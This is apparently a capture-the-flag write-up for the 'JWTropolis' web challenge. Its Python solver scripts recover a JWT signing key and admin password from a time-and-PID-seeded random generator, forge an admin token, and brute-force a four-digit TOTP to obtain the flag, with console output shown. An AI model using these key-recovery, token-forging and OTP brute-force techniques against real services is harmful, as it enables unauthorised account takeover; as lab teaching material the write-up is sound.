# JWTropolis

<figure><img src="../../../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Let's read the challenge server files



<pre class="language-python"><code class="lang-python"><strong># i registered a user sbeve:sbeve
</strong><strong>
</strong><strong>@app.route('/register', methods=['GET', 'POST'])
</strong>def register():
	if request.method == 'POST':
		username = request.form['username']
		password = request.form['password']
		existing_user = User.query.filter_by(username=username).first()
		if existing_user:
			return render_template('register.html', error="Username already taken"), 400
		hashed_password = generate_password_hash(password)
		new_user = User(username=username, password=hashed_password, role=0)
		db.session.add(new_user)
		db.session.commit()
		return redirect(url_for('login'))
	return render_template('register.html')
</code></pre>



```python
up = math.floor(time.time()) # server Uptime
random.seed(up + os.getpid())

print("Starting server at", up)
print("Process ID:", os.getpid())

strongpassword = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

app = Flask(__name__)
app.config['SECRET_KEY'] = "".join(random.choice(string.printable) for _ in range(32))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////app/data/site.db'
app.config['JWT_SECRET_KEY'] = "".join(random.choice(string.printable) for _ in range(32))
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['JWT_COOKIE_CSRF_PROTECT'] = False 

db = SQLAlchemy(app)
jwt = JWTManager(app)

FLAG = os.getenv("FLAG", "flag{this_is_a_fake_flag}")

class User(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	username = db.Column(db.String(80), unique=True, nullable=False)
	password = db.Column(db.String(80), nullable=False)
	avatar = db.Column(db.String(80), nullable=True)
	role = db.Column(db.Integer, nullable=False) # 0 = student, 1 = teacher, 2 = admin
	totp_secret = db.Column(db.Integer, nullable=True) # Only for admin users / 4 digits
 
@app.route("/status")
def status():
	return jsonify(status="OK", uptime=time.time() - up)
```









We got the server uptime&#x20;

<figure><img src="../../../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>



```python
import random
import string
import time
import jwt
import requests


# login with the new user
login_url = "http://51.77.140.155:9100/login"
jwt_cookie = None  # Define outside loop        
login_data = {
    "username": "sbeve",
    "password": "sbeve",
    "loginstep1": ""
}

try:
    print("Logging in with new user...")
    response = requests.post(login_url, data=login_data, allow_redirects=False, timeout=5)
    if response.status_code == 302:
        print("Login successful!")
        cookies = response.cookies
        jwt_cookie = cookies.get("access_token_cookie")
        print(f"JWT Cookie: {jwt_cookie}")
    else:
        print(f"Login failed (Status: {response.status_code})")
        print("Cannot proceed without JWT cookie.")
        exit(1)
except Exception as e:
    print(f"Error during login: {e}")
    print("Cannot proceed without JWT cookie.")
    exit(1)
    
# Fetch uptime from server
server_url = "http://51.77.140.155:9100/status"
try:
    print("Fetching server status...")
    response = requests.get(server_url, timeout=5).json()
    uptime = int(float(response["uptime"]))
    current_time = int(time.time())
    up = current_time - uptime
    print(f"Server responded - up: {up}, Uptime: {uptime}")
except Exception as e:
    print(f"Failed to reach server: {e}")
    print("Cannot proceed without server uptime.")
    exit(1)

# Decode JWT with server-provided up
jwt_key = None  # Define outside loop
found = False
timeout = 10  # ±10 seconds threshold for server - client difference
for tt in range(up - timeout, up + timeout + 1):
    print(f"Trying up: {tt}")
    for pid in range(1, 100):
        random.seed(tt + pid)
        strongpassword = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
        secret_key = "".join(random.choice(string.printable) for _ in range(32))
        jwt_key_candidate = "".join(random.choice(string.printable) for _ in range(32))
        try:
            decoded = jwt.decode(jwt_cookie, jwt_key_candidate, algorithms=["HS256"])
            print(f"\nStep 1: Successfully decoded JWT!")
            print(f"up (adjusted): {tt}, PID: {pid}")
            print(f"Original server up: {up}")
            print(f"Strong Password: {strongpassword}")
            print(f"SECRET_KEY: {secret_key}")
            print(f"JWT_SECRET_KEY: {jwt_key_candidate}")
            print(f"Decoded JWT: {decoded}")
            jwt_key = jwt_key_candidate  # Store the correct key
            found = True
            break
        except jwt.InvalidTokenError:
            if pid % 25 == 0:
                print(f"PID {pid} failed for up: {tt}")
            continue
    if found:
        break

if not found:
    print("Failed to decode JWT within timeout threshold.")
    exit(1)

# Step 2: Forge admin JWT and brute-force TOTP
admin_payload = {
    "fresh": False,
    "iat": int(time.time()),
    "jti": "44aefe9b-59a9-49a0-980b-7bd572af49aa",
    "type": "access",
    "sub": "sbeve",  # Target the real admin user
    "nbf": int(time.time()),
    "exp": int(time.time()) + 3600,
    "role": 2,
    "avatar": None,
    "totp": 0000  # Placeholder; will be updated in loop
}


# Sign the payload with the correct JWT key
print(f"Using JWT key: {jwt_key}")
print("Forging admin JWT...")
forged_token = jwt.encode(admin_payload, jwt_key, algorithm="HS256")
print(f"Forged JWT: {forged_token}")

```

```powershell
PS C:\Users\saleh\Downloads\CTFKareemSecurinetsTekup> python .\jw\challenge\solver.py
Logging in with new user...
Login successful!
JWT Cookie: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjA0NjAyNiwianRpIjoiMmY5MWE5OTktNWZmZC00NTM1LThmMTgtODRiOGFiOGI1MjNmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNiZXZlIiwibmJmIjoxNzQyMDQ2MDI2LCJleHAiOjE3NDIwNDY5MjYsInJvbGUiOjAsImF2YXRhciI6bnVsbCwidG90cCI6bnVsbH0.TtSC7I80Tlp4R0UAWzGdBgPOJ4ZC9gRpavGYn2n-XSM
Fetching server status...
Server responded - up: 1741746923, Uptime: 299104
Trying up: 1741746913

Step 1: Successfully decoded JWT!
up (adjusted): 1741746913, PID: 10
Original server up: 1741746923
Strong Password: ywrq4loihIWcRewq # Admin Password as mentinned
SECRET_KEY: bwAgO]k}d=J<t2*UF89!2
JWT_SECRET_KEY: L6kb♀]tJ\JQ#JH~LRDGbH?CTC(W7A Q,
Decoded JWT: {'fresh': False, 'iat': 1742046026, 'jti': '2f91a999-5ffd-4535-8f18-84b8ab8b523f', 'type': 'access', 'sub': 'sbeve', 'nbf': 1742046026, 'exp': 1742046926, 'role': 0, 'avatar': None, 'totp': None}
Using JWT key: L6kb♀]tJ\JQ#JH~LRDGbH?CTC(W7A Q,
Forging admin JWT...
Forged JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjA0NjAyNywianRpIjoiNDRhZWZlOWItNTlhOS00OWEwLTk4MGItN2JkNTcyYWY0OWFhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNiZXZlIiwibmJmIjoxNzQyMDQ2MDI3LCJleHAiOjE3NDIwNDk2MjcsInJvbGUiOjIsImF2YXRhciI6bnVsbCwidG90cCI6MH0.YKZdzAQgWkNN0dBL-Jres2MU1cisK0txWjha1BMjR8k 
```

```python
# /fetchstaff needs role >= 1 , forging the JWT helped us here
@app.route("/fetchstaff")
@jwt_required()
def staff():
	if get_jwt()["role"] < 1:
		return "Unauthorized", 403
	staff = User.query.filter(User.role > 0).all()
	return jsonify([{"username": s.username, "avatar": s.avatar} for s in staff])
```



Using the forget JWT to /fetchtstaff&#x20;

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjA0NjAyNywianRpIjoiNDRhZWZlOWItNTlhOS00OWEwLTk4MGItN2JkNTcyYWY0OWFhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNiZXZlIiwibmJmIjoxNzQyMDQ2MDI3LCJleHAiOjE3NDIwNDk2MjcsInJvbGUiOjIsImF2YXRhciI6bnVsbCwidG90cCI6MH0.YKZdzAQgWkNN0dBL-Jres2MU1cisK0txWjha1BMjR8k
```

<figure><img src="../../../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

So the username is&#x20;

```
KonaN.g7q9g4ea7q@seurinets.tekup
```

and the password is the strongPassword&#x20;

```
ywrq4loihIWcRewq 
```

Now it's time to bruteforce the otp and get the FLAG\


<pre class="language-python"><code class="lang-python"><strong># /dahsboard
</strong><strong>@app.route("/dashboard")
</strong>@jwt_required()
def dashboard():
    username = get_jwt()["sub"]
    
    user = User.query.filter_by(username=username).first()
    if user is None:
        return "User not found", 404
    
    if user.role == 2 and get_jwt()["totp"] == user.totp_secret:
        return render_template("dashboard.html", user=user, flag=FLAG)

    return render_template("dashboard.html", user=user, flag="are u admin? cuz i'm not :p")
</code></pre>



```python
# Brute Brute Brute Force

import requests
import time

def test_connectivity():
    try:
        response = requests.get("http://51.77.140.155:9100/", timeout=10)
        print(f"Server reachable: Status {response.status_code}")
        return True
    except Exception as e:
        print(f"Server connectivity test failed: {e}")
        return False

def brute_force_totp_sequential():
    login_url = "http://51.77.140.155:9100/login"
    dashboard_url = "http://51.77.140.155:9100/dashboard"
    headers = {
        "Host": "51.77.140.155:9100",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://51.77.140.155:9100",
        "Connection": "keep-alive",
        "Referer": "http://51.77.140.155:9100/login",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    print("Starting sequential TOTP brute-force from 1000 to 2000...")
    for totp in range(0000,9999):
        totp_str = str(totp).zfill(4)
        data = {
            "username": "KonaN.g7q9g4ea7q@seurinets.tekup",
            "password": "ywrq4loihIWcRewq",
            "totp": totp_str,
            "loginstep1": ""
        }

        print(f"Trying TOTP: {totp_str}")

        try:
            response = requests.post(login_url, headers=headers, data=data, allow_redirects=False, timeout=10)
            if response.status_code == 302:
                print(f"\nLogin successful with TOTP: {totp_str}")
                cookies = response.cookies
                jwt_cookie = cookies.get("access_token_cookie")
                print(f"JWT Cookie: {jwt_cookie}")

                dash_response = requests.get(dashboard_url, 
                                           cookies={"access_token_cookie": jwt_cookie}, 
                                           timeout=10)
                response_text = dash_response.text
                print(f"Dashboard response: {response_text}")

                if "Securinets" in response_text:
                    flag = response_text.split("Securinets")[1].split("}")[0]
                    flag = f"Securinets{{{flag}}}"
                    print(f"\nSuccess! Flag: {flag} (TOTP: {totp_str})")
                    return flag
                else:
                    print("No flag found in dashboard response.")
            else:
                print(f"TOTP {totp_str} failed (Status: {response.status_code})")
        except Exception as e:
            print(f"Error for TOTP {totp_str}: {e}")
            continue

    print("Failed to find correct TOTP after trying 1000-2000.")
    return None

if __name__ == "__main__":
    print("Brute-forcing TOTP (1000-2000) sequentially via /login...")
    if test_connectivity():
        flag = brute_force_totp_sequential()
        if flag:
            print(f"Final Result: {flag}")
        else:
            print("No flag found in the range 1000-2000.")
    else:
        print("Aborting due to server connectivity issues.")
```





```powershell
PS C:\Users\saleh\Downloads\CTFKareemSecurinetsTekup\jw\challenge> python .\brute.py
Brute-forcing TOTP (1000-2000) sequentially via /login...
...
TOTP 1335 failed (Status: 400)
TOTP 1336 failed (Status: 400)
Trying TOTP: 1337

Login successful with TOTP: 1337
JWT Cookie: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MjA0NjU1MSwianRpIjoiMGE4MjI5MGQtZmFjOC00YTYzLWFhNTYtYTBlNzBiNDk2NmQ1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6IktvbmFOLmc3cTlnNGVhN3FAc2V1cmluZXRzLnRla3VwIiwibmJmIjoxNzQyMDQ2NTUxLCJleHAiOjE3NDIwNDc0NTEsInJvbGUiOjIsImF2YXRhciI6Ii9hc3NldHMvaW1nL0tvbmFOLnBuZyIsInRvdHAiOjEzMzd9.hrJFsuvfnS7dMEG54nJroArxOy67qGjJtYuT9WxiTvs
Dashboard response: ....
        <h3 class="text-xl font-semibold text-gray-700">Your Flag:</h3>
        <p class="text-2xl text-green-600 font-bold">Securinets{JWT_juGGliNg_w1th_T0TP_m4st3ry!}</p>
      </div>
...
Success! Flag: Securinets{JWT_juGGliNg_w1th_T0TP_m4st3ry!} (TOTP: 1337)
```

